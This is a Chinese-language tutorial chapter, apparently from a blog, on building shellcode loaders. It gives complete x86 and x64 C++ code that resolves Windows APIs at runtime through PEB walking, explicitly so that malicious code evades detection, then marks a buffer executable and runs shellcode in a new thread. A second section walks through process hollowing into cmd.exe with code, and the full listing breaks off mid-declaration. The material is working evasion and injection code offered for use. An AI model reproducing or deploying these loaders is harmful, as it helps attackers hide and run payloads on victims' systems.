<h1 id="14-动态api函数加载"><a href="#14-动态api函数加载" class="headerlink" title="14.动态api函数加载"></a>14.动态api函数加载</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>传统的静态导入API函数会在可执行文件的导入表中明确列出所有用到的函数。这使得恶意代码容易被安全工具和分析人员发现，因为敏感API函数的使用通常表明了恶意行为。</p>
<p>而动态调用API函数，如本示例中的代码所展示的，可以在运行时动态解析并获取API函数的地址。这样，敏感函数不会出现在导入表中，从而使得恶意代码更难被发现。此外，动态调用API函数还可以结合其他技术（如代码混淆、加密等）来进一步提高恶意代码的隐蔽性</p>
<h2 id="实现思路-1"><a href="#实现思路-1" class="headerlink" title="实现思路"></a>实现思路</h2><ul>
<li>定位关键模块：首先找到包含核心API函数的关键模块（如kernel32.dll）。这通常可以通过解析PEB（Process Environment Block）中的模块列表来完成。</li>
<li>获取GetProcAddress：定位到kernel32.dll后，需要解析导出表（Export Table）以获取GetProcAddress函数的地址。GetProcAddress是一个核心函数，用于在运行时动态解析其他API函数的地址。</li>
<li>加载其他API：通过GetProcAddress函数，可以逐个获取其他需要的API函数的地址。例如，可以通过GetProcAddress获取VirtualProtect、CreateThread和WaitForSingleObject等函数的地址。</li>
<li>准备Shellcode：将Shellcode存储在缓冲区中，使用VirtualProtect函数将缓冲区的内存页属性更改为可执行，以确保可以安全地执行Shellcode。</li>
<li>创建线程并执行Shellcode：使用CreateThread函数创建一个新线程，并将Shellcode的地址作为线程的启动例程。线程创建后，使用WaitForSingleObject等待线程执行完成</li>
</ul>
<h2 id="x86代码实现"><a href="#x86代码实现" class="headerlink" title="x86代码实现"></a>x86代码实现</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明定义api函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* p_GetProcAddress)</span><span class="params">(_In_ HMODULE hModule, _In_ LPCSTR lpProcName)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* p_LoadLibraryA)</span><span class="params">(__in LPCSTR lpLibFileName)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* p_VirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* p_CreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* p_WaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内联汇编函数，用于获取Kernel32.dll模块的基地址</span></span><br><span class="line">HMODULE <span class="keyword">inline</span> __declspec(naked) <span class="built_in">GetKernel32Moudle</span>()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, fs: [<span class="number">0x30</span>] ;</span><br><span class="line">        mov eax, [eax + <span class="number">0xc</span>];</span><br><span class="line">        mov eax, [eax + <span class="number">0x14</span>]</span><br><span class="line">            mov eax, [eax];</span><br><span class="line">        mov eax, [eax];</span><br><span class="line">        mov eax, [eax + <span class="number">0x10</span>];</span><br><span class="line">        ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取GetProcAddress函数的地址</span></span><br><span class="line"><span class="function">DWORD <span class="title">pGetProcAddress</span><span class="params">(HMODULE Kernel32Base)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> szGetProcAddr[] = &#123; <span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    DWORD result = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历kernel32.dll的导出表，找到GetProcAddr函数地址</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)Kernel32Base;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)((DWORD)Kernel32Base + pDosHead-&gt;e_lfanew);</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp;pNtHead-&gt;OptionalHeader;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)Kernel32Base + pOptHead-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    DWORD* pAddOfFun_Raw = (DWORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfFunctions);</span><br><span class="line">    WORD* pAddOfOrd_Raw = (WORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line">    DWORD* pAddOfNames_Raw = (DWORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfNames);</span><br><span class="line">    <span class="type">char</span>* pFinded = <span class="literal">NULL</span>, * pSrc = szGetProcAddr;</span><br><span class="line">    <span class="keyword">for</span> (DWORD dwCnt = <span class="number">0</span>; dwCnt &lt; pExport-&gt;NumberOfNames; dwCnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        pFinded = (<span class="type">char</span>*)((DWORD)Kernel32Base + pAddOfNames_Raw[dwCnt]);</span><br><span class="line">        <span class="keyword">while</span> (*pFinded &amp;&amp; *pFinded == *pSrc)</span><br><span class="line">        &#123;</span><br><span class="line">            pFinded++; pSrc++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*pFinded == *pSrc)</span><br><span class="line">        &#123;</span><br><span class="line">            result = (DWORD)Kernel32Base + pAddOfFun_Raw[pAddOfOrd_Raw[dwCnt]];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pSrc = szGetProcAddr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;填写x86的shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hKernal32 = <span class="built_in">GetKernel32Moudle</span>(); <span class="comment">// 获取Kernel32模块的地址</span></span><br><span class="line">    p_GetProcAddress GetProcAddress = (p_GetProcAddress)<span class="built_in">pGetProcAddress</span>(hKernal32); <span class="comment">// 获取GetProcAddress函数的地址</span></span><br><span class="line">    p_VirtualProtect VirtualProtect = (p_VirtualProtect)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);  <span class="comment">//获取VirtualProtect函数地址</span></span><br><span class="line">    p_CreateThread CreateThread = (p_CreateThread)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;CreateThread&quot;</span>);  <span class="comment">//获取CreateThread函数地址</span></span><br><span class="line">    p_WaitForSingleObject WaitForSingleObject = (p_WaitForSingleObject)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);  <span class="comment">//获取WaitForSingleObject函数地址</span></span><br><span class="line"></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="x64代码实现"><a href="#x64代码实现" class="headerlink" title="x64代码实现"></a>x64代码实现</h2><p>由于x64无法编写内联汇编代码, 因此需另创一个asm文件来进行编写</p>
<img src="shellcode加载器/image-20230505164445694.png" alt="image-20230505164445694" style="zoom:67%;" />		



<p>此处我创建了一个<code>GetInitializationOrderModuleList.asm</code>, 用于获取<code>InitializationOrderModuleList</code>, 其代码如下所示:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.CODE</span><br><span class="line">    GetInInitializationOrderModuleList PROC</span><br><span class="line">    mov rax,gs:[60h] ; PEB，注意，这里不能写0x60</span><br><span class="line">    mov rax,[rax+18h] ; PEB_LDR_DATA</span><br><span class="line">    mov rax,[rax+30h] ; InInitializationOrderModuleList</span><br><span class="line">    ret ; 这里不能写retn</span><br><span class="line">    GetInInitializationOrderModuleList ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>



<p>随后鼠标右键单击新建的asm文件, 选择属性, 在常规选项处将<code>从生成中排除</code>设置为<code>否</code>, 项类型设置为<code>自定义生成工具</code></p>
<img src="shellcode加载器/image-20230505164722633.png" alt="image-20230505164722633" style="zoom:67%;" />	



<p>在自定义生成工具选项处, 在命令行框输入:<code>ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm</code>, 在输出框输入:<code>$(IntDir)%(FileName).obj</code></p>
<img src="shellcode加载器/image-20230505165453883.png" alt="image-20230505165453883" style="zoom:67%;" />	



<p>打开项目属性，勾选<code>C/C++-&gt;代码生成-&gt;禁用安全检查</code></p>
<img src="shellcode加载器/image-20230505171010208.png" alt="image-20230505171010208" style="zoom:67%;" />	



<p>以下是shellcode加载代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// UNICODE_STRING 结构体定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> &#123;</span><br><span class="line">    USHORT Length;  <span class="comment">//表示字符串中的字符数,由于它是unicode形式的字符,因此每个字符占两个字节</span></span><br><span class="line">    USHORT MaximumLength;  <span class="comment">//分配的内存空间的大小，以字节为单位</span></span><br><span class="line">    PWSTR Buffer;  <span class="comment">//表示指向存储Unicode字符串的字符数组的指针</span></span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明获取 InInitializationOrderModuleList 链表的函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">PVOID64 __stdcall <span class="title">GetInInitializationOrderModuleList</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Kernel32.dll 的基地址</span></span><br><span class="line"><span class="function">HMODULE <span class="title">getKernel32Address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 InInitializationOrderModuleList 链表</span></span><br><span class="line">    LIST_ENTRY* pNode = (LIST_ENTRY*)<span class="built_in">GetInInitializationOrderModuleList</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取 FullDllName 成员</span></span><br><span class="line">        UNICODE_STRING* FullDllName = (UNICODE_STRING*)((BYTE*)pNode + <span class="number">0x38</span>);</span><br><span class="line">        <span class="comment">// 如果 Buffer 中的第 13 个字符为空字符，则已找到 Kernel32.dll</span></span><br><span class="line">        <span class="keyword">if</span> (*(FullDllName-&gt;Buffer + <span class="number">12</span>) == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 返回模块的基地址</span></span><br><span class="line">            <span class="keyword">return</span> (HMODULE)(*((ULONG64*)((BYTE*)pNode + <span class="number">0x10</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        pNode = pNode-&gt;Flink;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GetProcAddress 函数的地址</span></span><br><span class="line"><span class="function">DWORD64 <span class="title">getGetProcAddress</span><span class="params">(HMODULE hKernal32)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 DOS 头</span></span><br><span class="line">    PIMAGE_DOS_HEADER baseAddr = (PIMAGE_DOS_HEADER)hKernal32;</span><br><span class="line">    <span class="comment">// 获取 NT 头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pImageNt = (PIMAGE_NT_HEADERS)((LONG64)baseAddr + baseAddr-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 获取导出表</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LONG64)baseAddr + pImageNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    <span class="comment">// 获取导出函数地址数组、导出函数名数组和导出函数序号数组</span></span><br><span class="line">    PULONG RVAFunctions = (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfFunctions);</span><br><span class="line">    PULONG RVANames = (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfNames);</span><br><span class="line">    PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)baseAddr + exportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历导出函数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        <span class="comment">// 获取当前函数地址</span></span><br><span class="line">        LONG64 F_va_Tmp = (ULONG64)((LONG64)baseAddr + RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]);</span><br><span class="line">        <span class="comment">// 获取当前函数名地址</span></span><br><span class="line">        PUCHAR FunctionName = (PUCHAR)((LONG64)baseAddr + RVANames[i]);</span><br><span class="line">        <span class="comment">// 如果当前函数名是 &quot;GetProcAddress&quot;，返回其地址</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span>*)FunctionName, <span class="string">&quot;GetProcAddress&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> F_va_Tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* pGetProcAddress)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义包含 shellcode 的缓冲区</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line">        <span class="string">&quot;填写x64的shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 Kernel32.dll 的基地址和GetProcAddress函数地址</span></span><br><span class="line">    HMODULE hKernal32 = <span class="built_in">getKernel32Address</span>(); <span class="comment">// 获取Kernel32.dll的基地址</span></span><br><span class="line">    pGetProcAddress GetProcAddress = (pGetProcAddress)<span class="built_in">getGetProcAddress</span>(hKernal32); <span class="comment">// 获取GetProcAddress函数地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取其他所需API函数地址</span></span><br><span class="line">    pVirtualProtect VirtualProtect = (pVirtualProtect)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">    pCreateThread CreateThread = (pCreateThread)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">    pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//修改shellcode缓冲区的内存保护属性，以便执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建新线程执行shellcode并等待其执行完成</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="15-进程镂空注入"><a href="#15-进程镂空注入" class="headerlink" title="15.进程镂空注入"></a>15.进程镂空注入</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>进程镂空（Process Hollowing），又称为“傀儡进程”，是一种恶意软件（malware）利用的代码注入技术。它主要用于将恶意代码注入到合法进程中，以规避安全检测、提高恶意代码执行的隐蔽性和稳定性</p>
<h2 id="实现思路-2"><a href="#实现思路-2" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-创建挂起进程"><a href="#1-创建挂起进程" class="headerlink" title="1.创建挂起进程"></a>1.创建挂起进程</h3><p>创建一个新的目标进程（这里是cmd.exe），并将其创建为挂起状态，这样它的主线程不会立即执行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL bRet = <span class="built_in">CreateProcessA</span>(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (LPSTR)<span class="string">&quot;cmd&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    FALSE,</span><br><span class="line">    CREATE_SUSPENDED,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    &amp;si,</span><br><span class="line">    &amp;pi);</span><br></pre></td></tr></table></figure>



<h3 id="2-读取恶意程序的内容"><a href="#2-读取恶意程序的内容" class="headerlink" title="2.读取恶意程序的内容"></a>2.读取恶意程序的内容</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读取恶意程序的内容至本进程内存中</span></span><br><span class="line">hFile = <span class="built_in">CreateFileA</span>(path, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>); <span class="comment">//获取替换可执行文件的大小</span></span><br><span class="line">FileImage = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, FileImage, dwFileSize, &amp;FileReadSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取恶意程序的文件头信息(Dos头和Nt头)</span></span><br><span class="line">pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;  <span class="comment">//获取Dos头</span></span><br><span class="line">pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew); <span class="comment">//获取NT头</span></span><br></pre></td></tr></table></figure>



<h3 id="3-获取挂起进程的线程上下文和映像基址"><a href="#3-获取挂起进程的线程上下文和映像基址" class="headerlink" title="3.获取挂起进程的线程上下文和映像基址"></a>3.获取挂起进程的线程上下文和映像基址</h3><p>在挂起创建的进程中，<code>EBX</code>（在x86架构下）和<code>RDX</code>（在x64架构下）寄存器通常用于存储指向<code>PEB</code>（进程环境块）的指针。<code>PEB</code>是一个包含进程相关信息的数据结构，例如映像基地址、操作系统版本等。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取挂起进程的上下文</span></span><br><span class="line"><span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx); </span><br><span class="line">  </span><br><span class="line"><span class="comment">//获取可执行</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 从rbx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 从ebx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + <span class="number">8</span>), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h3 id="4-卸载挂起进程的内存"><a href="#4-卸载挂起进程的内存" class="headerlink" title="4.卸载挂起进程的内存"></a>4.卸载挂起进程的内存</h3><p>如果挂起进程的映像基址和恶意程序的映像基址相同，则调用NtUnmapViewOfSection卸载原始进程映像</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断文件预期加载地址是否被占用</span></span><br><span class="line">pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ((SIZE_T)RemoteImageBase == pNtHeaders-&gt;OptionalHeader.ImageBase)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NtUnmapViewOfSection</span>(pi.hProcess, RemoteImageBase); <span class="comment">//卸载已存在文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="5-将恶意程序内容写入目标进程"><a href="#5-将恶意程序内容写入目标进程" class="headerlink" title="5.将恶意程序内容写入目标进程"></a>5.将恶意程序内容写入目标进程</h3><p>先将恶意程序的头部信息写入目标进程，随后逐节将恶意程序的各个节写入</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为可执行映像分配内存,并写入文件头</span></span><br><span class="line">RemoteProcessMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pNtHeaders-&gt;OptionalHeader.ImageBase, pNtHeaders-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//逐段写入</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + (i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER)));</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders-&gt;VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders-&gt;PointerToRawData), pSectionHeaders-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="6-更新目标进程的线程上下文"><a href="#6-更新目标进程的线程上下文" class="headerlink" title="6.更新目标进程的线程上下文"></a>6.更新目标进程的线程上下文</h3><p>将程序计数器（EAX&#x2F;RAX 或 ECX&#x2F;RCX 寄存器）设置为替换映像的入口点地址，并更新目标进程PEB中的映像基地址</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<p>设置目标进程的线程上下文，使其使用新的上下文信息</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx); <span class="comment">// 设置线程上下文</span></span><br></pre></td></tr></table></figure>



<h3 id="7-恢复目标进程的主线程"><a href="#7-恢复目标进程的主线程" class="headerlink" title="7.恢复目标进程的主线程"></a>7.恢复目标进程的主线程</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ResumeThread</span>(pi.hThread); <span class="comment">// 恢复挂起线程</span></span><br></pre></td></tr></table></figure>



<h2 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtUnmapViewOfSection)</span><span class="params">(HANDLE, PVOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">wchar_t</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">// 定义变量和结构体</span></span><br><span class="line">    IN PIMAGE_DOS_HEADER pDosHeaders;</span><br><span class="line">    IN PIMAGE_NT_HEADERS pNtHeaders;</span><br><span class="line">    IN PIMAGE_SECTION_HEADER pSectionHeaders;</span><br><span class="line">    IN PVOID FileImage;</span><br><span class="line">    IN HANDLE hFile;</span><br><span class="line">    OUT DWORD FileReadSize;</span><br><span class="line">    IN DWORD dwFileSize;</span><br><span class="line">    IN PVOID 